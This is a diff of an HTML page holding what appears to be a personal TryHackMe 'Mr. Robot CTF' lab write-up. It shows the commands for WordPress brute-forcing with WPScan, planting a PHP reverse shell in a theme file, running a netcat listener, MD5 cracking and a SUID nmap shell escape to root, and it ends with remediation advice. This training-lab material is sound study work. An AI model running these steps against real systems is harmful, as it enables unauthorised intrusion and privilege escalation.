@@ -1,100 +1,274 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Mr. Robot CTF — OfflineDevc Writeups</title>
-  <link rel="stylesheet" href="../style.css" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mr. Robot CTF — Writeup | OfflineDevc</title>
+  <link rel="stylesheet" href="../style.css"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
 </head>
 <body>
-
+  <!-- NAV -->
   <nav class="navbar">
-    <div class="nav-inner">
-      <span class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></span>
-      <div class="nav-links">
-        <a href="../index.html#about">About</a>
-        <a href="../index.html#writeups">Writeups</a>
-        <a href="../index.html#contact">Contact</a>
-      </div>
+    <a href="../index.html" class="nav-logo">&lt;OfflineDevc/&gt;</a>
+    <div class="nav-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#writeups">Writeups</a>
     </div>
   </nav>
 
-  <header class="writeup-hero">
-    <div class="writeup-hero-inner">
-      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
-      <div class="card-header" style="margin-bottom:12px">
-        <span class="platform thm-badge">THM</span>
-        <span class="difficulty medium-badge">Medium</span>
+  <!-- WRITEUP HEADER -->
+  <section class="writeup-hero">
+    <div class="container">
+      <div class="writeup-meta-top">
+        <a href="../index.html#writeups" class="back-link">← All Writeups</a>
+        <span class="platform-badge thm">TryHackMe</span>
       </div>
       <h1 class="writeup-title">Mr. Robot CTF</h1>
-      <p style="color:#666;font-size:14px;margin-top:8px">Linux · robots.txt → WordPress Brute-force → Theme RCE → MD5 Crack → SUID Nmap</p>
-      <div class="meta-row">
-        <div class="meta-item">🖥 OS: <span>Linux</span></div>
-        <div class="meta-item">🎯 Target: <span><code>10.48.165.195</code></span></div>
+      <div class="writeup-badges">
+        <span class="badge diff-medium">Medium</span>
+        <span class="badge badge-os">Linux</span>
       </div>
     </div>
-  </header>
+  </section>
 
-  <article class="writeup-content">
+  <!-- WRITEUP CONTENT -->
+  <main class="writeup-body">
+    <div class="container writeup-content">
+<h1 id="mr-robot-ctf-tryhackme-writeup">Mr. Robot CTF - TryHackMe Writeup</h1>
+<hr />
+<h2 id="1-executive-summary-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Room Name</strong></td>
+<td style="text-align: left;">Mr. Robot CTF</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Platform</strong></td>
+<td style="text-align: left;">TryHackMe</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Operating System</strong></td>
+<td style="text-align: left;">Linux</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Target IP</strong></td>
+<td style="text-align: left;"><code>10.48.165.195</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Attacker IP</strong></td>
+<td style="text-align: left;"><code>192.168.132.94</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Difficulty</strong></td>
+<td style="text-align: left;">Medium</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Key Attack Vectors</strong></td>
+<td style="text-align: left;">Information Disclosure (<code>robots.txt</code>), WordPress Username Enumeration &amp; Dictionary Attack (<code>elliot</code> / <code>fsocity.dic</code>), Theme Editor PHP Reverse Shell, MD5 Hash Cracking (<code>robot</code>), SUID Nmap Interactive Mode Shell Escape</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113191354.png" /></p>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
+<ol>
+<li><strong>Reconnaissance &amp; Key 1</strong>:<br />
+   - <code>nmap -sT -sV -sC 10.48.165.195 -Pn</code> identified Port 80 and Port 443.<br />
+   - Visited <code>http://10.48.165.195/robots</code>, discovering <code>fsocity.dic</code> and <code>key-1-of-3.txt</code>.<br />
+   - Captured <strong>Key 1</strong>: <code>http://10.48.165.195/key-1-of-3.txt</code> ➔ <code>********************************</code>.</li>
+<li><strong>Initial Foothold &amp; Key 2</strong>:<br />
+   - Downloaded and sorted <code>fsocity.dic</code>.<br />
+   - Enumerated WordPress login on <code>http://10.48.165.195/wp-login.php</code>, confirming user <code>elliot</code>.<br />
+   - Brute-forced user <code>elliot</code> with WPScan using <code>fsocity.dic</code> ➔ <code>elliot:********</code>.<br />
+   - Injected PHP reverse shell into the Twenty Fifteen theme template (<code>404.php</code>).<br />
+   - Received reverse shell as user <strong><code>daemon</code></strong>.<br />
+   - In <code>/home/robot/</code>, cracked MD5 password hash (<code>c3fcd3d76192e4007dfb496cca67e13b</code> ➔ <code>********</code>).<br />
+   - Switched user via <code>su robot</code> and read <strong>Key 2</strong>: <code>cat key-2-of-3.txt</code> ➔ <code>********************************</code>.</li>
+<li><strong>Privilege Escalation to Root (Key 3)</strong>:<br />
+   - Found SUID binary <code>/usr/local/bin/nmap</code>.<br />
+   - Executed <code>/usr/local/bin/nmap --interactive</code> and escaped via <code>!sh</code> to gain root access.<br />
+   - Captured <strong>Key 3</strong>: <code>cat /root/key-3-of-3.txt</code> ➔ <code>********************************</code>.</li>
+</ol>
+<hr />
+<h2 id="2-phase-1-reconnaissance-key-1">2. Phase 1: Reconnaissance &amp; Key 1</h2>
+<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
+<p>We scan target <code>10.48.165.195</code>:</p>
+<pre><code class="language-bash">nmap -sT -sV -sC 10.48.165.195 -Pn
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107153110.png" /></p>
+<ul>
+<li><strong>Port 22/tcp</strong>: closed</li>
+<li><strong>Port 80/tcp</strong>: open http</li>
+<li><strong>Port 443/tcp</strong>: open https</li>
+</ul>
+<h3 id="22-web-exploration-robotstxt">2.2 Web Exploration &amp; Robots.txt</h3>
+<p>Visiting <code>http://10.48.165.195/</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107153213.png" /></p>
+<p>We test endpoints: <code>/readme</code> returns a custom message:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107153451.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261107153534.png" /></p>
+<p>Checking <code>http://10.48.165.195/robots</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107153556.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261107153612.png" /></p>
+<pre><code class="language-text">User-agent: *
+fsocity.dic
+key-1-of-3.txt
+</code></pre>
+<h3 id="23-retrieving-key-1-wordlist">2.3 Retrieving Key 1 &amp; Wordlist</h3>
+<p>We download <code>fsocity.dic</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107153629.png" /></p>
+<p>We navigate to <code>http://10.48.165.195/key-1-of-3.txt</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107153651.png" /></p>
+<pre><code class="language-text">********************************
+</code></pre>
+<ul>
+<li><strong>Key 1 Captured</strong>: <code>********************************</code></li>
+</ul>
+<hr />
+<h2 id="3-phase-2-wordpress-exploitation-key-2">3. Phase 2: WordPress Exploitation &amp; Key 2</h2>
+<h3 id="31-wordpress-user-enumeration">3.1 WordPress User Enumeration</h3>
+<p>We browse to <code>http://10.48.165.195/wp-login.php</code>:<br />
+Testing user <code>elliot</code> triggers the error (main charactors in mr.robot show):<br />
+<em>The password you entered for the username elliot is incorrect.</em><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261107154126.png" /></p>
+<h3 id="32-brute-forcing-password-via-wpscan">3.2 Brute-forcing Password via WPScan</h3>
+<p>We brute-force user <code>elliot</code> using the deduplicated <code>fsocity.dic</code> wordlist (sort -u):</p>
+<pre><code class="language-bash">wpscan --url http://10.48.165.195 -U elliot -P fsocity_clean.dic
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107154321.png" /></p>
+<ul>
+<li><strong>Credentials</strong>: <code>elliot</code> : <code>********</code></li>
+</ul>
+<h3 id="33-theme-editor-rce">3.3 Theme Editor RCE</h3>
+<p>Under <strong>Appearance &gt; Editor</strong>, we modify <code>404.php</code> to inject a PHP reverse shell:</p>
+<p>We log into WordPress:<br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261107154345.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261107154704.png" /><br />
+We start our listener and trigger <code>404.php</code>:</p>
+<pre><code class="language-bash">penelope nc -p 4444
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107154818.png" /><br />
+We gain access as user <strong><code>daemon</code></strong>.</p>
+<hr />
+<h3 id="34-pivoting-to-user-robot-retrieving-key-2">3.4 Pivoting to User <code>robot</code> &amp; Retrieving Key 2</h3>
+<p>In <code>/home/robot/</code>:<br />
+Reading <code>password.raw-md5</code>:</p>
+<pre><code class="language-bash">cat /home/robot/password.raw-md5
+# robot:c3fcd3d76192e4007dfb496cca67e13b
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107155033.png" /></p>
+<p>We crack the MD5 hash:</p>
+<pre><code class="language-bash">john --format=raw-md5 password.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>or CrackStation</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107155443.png" /></p>
+<ul>
+<li><strong>Cracked Password</strong>: <code>********</code></li>
+</ul>
+<p>We switch user to <code>robot</code>:</p>
+<pre><code class="language-bash">su robot
+# Password: ********
+whoami
+robot
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107155732.png" /></p>
+<p>We read the second flag:</p>
+<pre><code class="language-bash">$ cat key-2-of-3.txt
+********************************
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107155820.png" /></p>
+<ul>
+<li><strong>Key 2 Captured</strong>: <code>********************************</code></li>
+</ul>
+<hr />
+<h2 id="4-phase-3-privilege-escalation-to-root-key-3">4. Phase 3: Privilege Escalation to Root (Key 3)</h2>
+<h3 id="41-suid-binary-enumeration">4.1 SUID Binary Enumeration</h3>
+<p>We search for SUID binaries:</p>
+<pre><code class="language-bash">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107160013.png" /></p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107160114.png" /></p>
+<p>We discover <code>/usr/local/bin/nmap</code> with the SUID bit set.</p>
+<h3 id="42-exploitation-via-nmap-interactive-mode">4.2 Exploitation via Nmap Interactive Mode</h3>
+<p>We execute Nmap in interactive mode:</p>
+<pre><code class="language-bash">/usr/local/bin/nmap --interactive
+nmap&gt; /bin/bash
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107160227.png" /></p>
+<pre><code class="language-bash">whoami
+root
+</code></pre>
+<p>We read the final root key in <code>/root</code>:</p>
+<pre><code class="language-bash">root@ip-10-48-165-195:/root# cat key-3-of-3.txt
+********************************
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107160256.png" /></p>
+<ul>
+<li><strong>Key 3 Captured</strong>: <code>********************************</code></li>
+</ul>
+<hr />
+<h2 id="5-security-mitigations-remediation">5. Security Mitigations &amp; Remediation</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Vulnerability</th>
+<th style="text-align: left;">Impact</th>
+<th style="text-align: left;">Recommended Remediation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Information Disclosure (<code>robots.txt</code>)</strong></td>
+<td style="text-align: left;">Exposure of internal wordlists and secret paths.</td>
+<td style="text-align: left;">Remove sensitive filenames and directories from public robots files.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>WordPress Username Enumeration &amp; Dictionary Attack</strong></td>
+<td style="text-align: left;">Complete administrative dashboard takeover.</td>
+<td style="text-align: left;">Implement generic login failure messages and deploy rate-limiting / MFA.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Theme Editor Enabled</strong></td>
+<td style="text-align: left;">Arbitrary PHP script upload and execution.</td>
+<td style="text-align: left;">Set <code>define('DISALLOW_FILE_EDIT', true);</code> in <code>wp-config.php</code>.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Weak Password Hashing (Raw MD5)</strong></td>
+<td style="text-align: left;">Offline hash recovery.</td>
+<td style="text-align: left;">Use strong salted algorithms like Argon2id or bcrypt.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>SUID Bit on Nmap</strong></td>
+<td style="text-align: left;">Instant privilege escalation to root.</td>
+<td style="text-align: left;">Remove SUID permission (<code>chmod u-s /usr/local/bin/nmap</code>).</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="6-tools-used">6. Tools Used</h2>
+<ul>
+<li><strong>Nmap</strong>: Service discovery (<code>nmap -sT -sV -sC 10.48.165.195 -Pn</code>)</li>
+<li><strong>WPScan</strong>: WordPress brute-forcing (<code>elliot:********</code>)</li>
+<li><strong>John the Ripper</strong>: MD5 cracking (<code>********</code>)</li>
+<li><strong>Penelope / Netcat</strong>: Listener handling</li>
+<li><strong>GTFOBins</strong>: SUID Nmap interactive shell escape</li>
+</ul>
+    </div>
+  </main>
 
-    <table class="info-table">
-      <tr><th>Room Name</th><td>Mr. Robot CTF</td></tr>
-      <tr><th>Platform</th><td>TryHackMe</td></tr>
-      <tr><th>OS</th><td>Linux</td></tr>
-      <tr><th>Target IP</th><td>10.48.165.195</td></tr>
-      <tr><th>Difficulty</th><td>Medium</td></tr>
-      <tr><th>Key Techniques</th><td>Information Disclosure, WordPress Brute-force, Theme RCE, MD5 Crack, SUID Nmap</td></tr>
-    </table>
-
-    <h2>// Attack Chain</h2>
-    <div class="attack-chain">Recon (Nmap)
-  → Port 80 (HTTP) · Port 443 (HTTPS)
-  → /robots.txt → fsocity.dic, key-1-of-3.txt
-  → Key 1: ████████████████████████████████
-  → sort -u fsocity.dic → WPScan -U elliot -P wordlist
-  → elliot : ████████
-  → Appearance > Editor > 404.php → PHP reverse shell
-  → Shell as daemon
-  → /home/robot/password.raw-md5 → c3fcd3d76192e4007dfb496cca67e13b
-  → John / CrackStation → ████████
-  → su robot → cat key-2-of-3.txt → ████████████████████████████████
-  → find / -perm -u=s -f → /usr/local/bin/nmap (SUID)
-  → nmap --interactive → !/bin/bash → root
-  → cat /root/key-3-of-3.txt → ████████████████████████████████</div>
-
-    <h2>// Methodology</h2>
-    <p>This writeup follows the standard penetration testing lifecycle:
-    <strong>Reconnaissance</strong> → <strong>Enumeration</strong> → <strong>Exploitation</strong> →
-    <strong>Post-Exploitation</strong> → <strong>Privilege Escalation</strong> → <strong>Remediation</strong>.</p>
-    <p style="color:#555;font-size:13px;margin-top:12px">
-      📸 Full screenshot evidence is available in the original report.
-      Sensitive flags and credentials are redacted in compliance with TryHackMe guidelines.
-    </p>
-
-    <h2>// Tools Used</h2>
-    <ul style="color:#888;font-size:13px;line-height:2.2;margin-left:20px">
-      <li><code>Nmap</code></li>
-      <li><code>WPScan</code></li>
-      <li><code>Penelope</code></li>
-      <li><code>John the Ripper</code></li>
-      <li><code>CrackStation</code></li>
-    </ul>
-
-  </article>
-
+  <!-- FOOTER -->
   <footer class="footer">
-    <div class="footer-inner">
-      <div class="footer-links">
-        <a href="https://github.com/OfflineDevc" target="_blank">GitHub</a>
-        <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a>
-        <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a>
-        <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a>
-      </div>
-      <p class="footer-copy">© 2026 Kun Poonkasetvatana. Educational purposes only.</p>
-    </div>
+    <p>Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+       <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
+       <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
   </footer>
-
 </body>
 </html>
